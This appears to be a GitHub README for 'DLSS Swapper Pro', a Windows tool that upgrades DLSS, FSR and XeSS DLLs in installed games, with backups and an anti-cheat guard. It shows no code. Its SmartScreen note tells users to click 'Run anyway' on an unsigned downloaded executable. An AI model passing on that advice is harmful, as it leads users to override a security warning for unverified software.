<p align="center">
  <img src="https://i.postimg.cc/8cXP6qfn/banner.png" alt="DLSS Swapper Pro — Upgrade DLSS, Frame Generation, FSR 3.1 & XeSS DLLs in 1 Click" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-DLSS%20%26%20FSR%20DLL%20Swapper-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-dlss--swapper--v1.4-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# DLSS Swapper Pro — Upgrade DLSS, Frame Generation, FSR 3.1 & XeSS DLLs in 1 Click

**Playing games shipping with blurry 2-year-old DLSS 2.x or FSR 2.x DLLs? Scan your Steam, Epic Games, GOG, and Xbox libraries automatically, upgrade nvngx_dlss.dll and Frame Generation to the latest sharp Transformer presets, and keep instant .bak rollbacks.**

DLSS Swapper Pro automates upscaler DLL management across every PC storefront: **detecting `nvngx_dlss.dll`, `nvngx_dlssg.dll`, `amd_fidelityfx_dx12.dll`, and `libxess.dll` inside installed game folders, backing up original DLLs, and applying clean upgrades with anti-cheat safety guards**.

This project is aimed at **Windows 10 and Windows 11 (64-bit) PC gamers** upgrading upscaling quality in single-player titles—automatically skipping anti-cheat protected multiplayer executables.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Game ships with outdated `nvngx_dlss.dll` causing ghosting & shimmer | Developers rarely update bundled upscaler DLLs after launch | Upgrade `nvngx_dlss.dll` to the latest DLSS 4 Transformer build in 1 click |
| Manually hunting `Engine\Plugins\Runtime\Nvidia\DLSS` folders | Deeply nested UE4/UE5 binary folders vary per game | Auto-scan Steam, Epic, GOG, and Ubisoft libraries for every upscaler DLL |
| Concern about swapping DLLs in online anti-cheat games | Replacing signed DLLs in EAC/BattlEye/Vanguard games triggers kicks | Built-in **Anti-Cheat Guard** flags protected games and locks them read-only |
| Game update or driver change requires restoring the original DLL | Overwriting without backups forces a full Steam file verification | Save `nvngx_dlss.dll.bak` automatically for 1-click **Restore Original DLL** |

## Download for Windows

[**Download DLSSSwapperPro.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/DLSSSwapperPro.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `DLSSSwapperPro.exe`? (Key features)

- Scans Steam (`libraryfolders.vdf`), Epic Games, GOG Galaxy, and custom folders for `DLSS`, `DLSS-G`, `FSR 3.1`, and `XeSS` DLLs.
- Displays current DLL version vs. latest available version side-by-side for every game.
- Creates an automatic `*.dll.bak` backup before swapping any file, with 1-click **Restore Stock DLL**.
- Built-in **Anti-Cheat Guard** detects Easy Anti-Cheat, BattlEye, and Vanguard folders to prevent accidental multiplayer swaps.

### Sample Output

```text
[DLSSSwapperPro] Scanned 34 Installed Games across Steam & Epic Libraries
[OK]   ClairObscur_UE5  : nvngx_dlss.dll v3.7.0  --->  Upgraded to v310.2.1 (Preset K)
[OK]   Cyberpunk2077    : nvngx_dlssg.dll v3.7.10 --->  Upgraded to v310.2.0 (Frame Gen)
[WARN] ARCRaiders       : EasyAntiCheat_EOS detected -> Swap locked for online safety
```

The release ZIP is named `DLSSSwapperPro.zip`; the Windows executable inside is named `DLSSSwapperPro.exe`.

1. Close DLSS Swapper Pro before updating or replacing executable files.
2. Click **Download DLSSSwapperPro.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `DLSSSwapperPro.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit) with NVIDIA RTX, AMD Radeon, or Intel Arc graphics.

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `DLSSSwapperPro.exe` runs locally without uploading your personal files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### Eliminating motion ghosting and foliage shimmer in older DLSS games

Swapping to modern DLSS 4 Transformer DLLs dramatically improves fine detail and temporal stability.

### No manual folder digging across multi-SSD libraries

Finds every `nvngx_dlss.dll` across `C:`, `D:`, and `E:` in seconds.

### Automatic `.bak` rollback per game

Revert any single game back to its original shipping DLL in one click.

### Built-in anti-cheat protection

Prevents accidental DLL replacement in competitive multiplayer games.

## Default folders and configuration paths

DLSS Swapper Pro stores cached DLL versions and per-game backups in `%LOCALAPPDATA%\DLSSSwapperPro`:

```text
%LOCALAPPDATA%\DLSSSwapperPro\backups\
```

Typical directory layout:

```text
<GameFolder>\Engine\Plugins\Runtime\Nvidia\DLSS\Binaries\ThirdParty\Win64\
├── nvngx_dlss.dll       (Upgraded DLL)
└── nvngx_dlss.dll.bak   (Original backed-up DLL)
```

Never swap DLLs inside online multiplayer games protected by Easy Anti-Cheat, BattlEye, Riot Vanguard, or Ricochet.

## Quick start guide

Follow these steps to get started:

1. **Extract `DLSSSwapperPro.zip` and launch `DLSSSwapperPro.exe`.** Wait 2 seconds for your Steam/Epic game libraries to scan.
2. **Select any single-player game showing an older DLSS/FSR/XeSS version.** Click **Upgrade DLL** (automatic `.bak` backup is created first).
3. **Launch the game and enjoy sharper image reconstruction and reduced ghosting.** Click **Restore Original** anytime to revert.

### Data safety note

Original shipping DLLs are always preserved with `.bak` extensions and in `%LOCALAPPDATA%\DLSSSwapperPro\backups`.

## What the status summary shows

DLSS Swapper Pro displays **detected games, current vs. target DLL versions, anti-cheat protection flags, and backup status**.

## FAQ

**Does upgrading nvngx_dlss.dll improve image quality in older RTX games?**

Yes—newer DLSS DLLs bring improved temporal anti-aliasing and reduced ghosting without needing a game patch.

**Is it safe to swap DLSS DLLs in multiplayer games?**

No—DLSS Swapper Pro automatically detects anti-cheat folders and warns you not to modify online multiplayer games.

**How do I undo a DLL swap?**

Select the game in DLSS Swapper Pro and click 'Restore Original DLL'.

## Useful reading

- [NVIDIA DLSS Developer Documentation](https://developer.nvidia.com/rtx/dlss)

## More Windows Gaming Utilities

- [UE5-EngineIniStutterTuner](../UE5-EngineIniStutterTuner) — One-click Unreal Engine 5 Engine.ini stutter & texture pool tuner
- [ShaderCache-UnlimitedGPUUnlock](../ShaderCache-UnlimitedGPUUnlock) — Unlock NVIDIA/AMD shader cache limits & purge stale DX12 caches
- [WidescreenFix-FOVConfigPatcher](../WidescreenFix-FOVConfigPatcher) — 21:9 & 32:9 ultrawide aspect ratio hex & INI config patcher
- [ModDrop-UniversalPakInstaller](../ModDrop-UniversalPakInstaller) — Drag-and-drop ZIP/PAK mod installer with conflict check

*Independent open-source desktop utility for Windows. Not affiliated with NVIDIA, AMD, Intel, or Valve.*
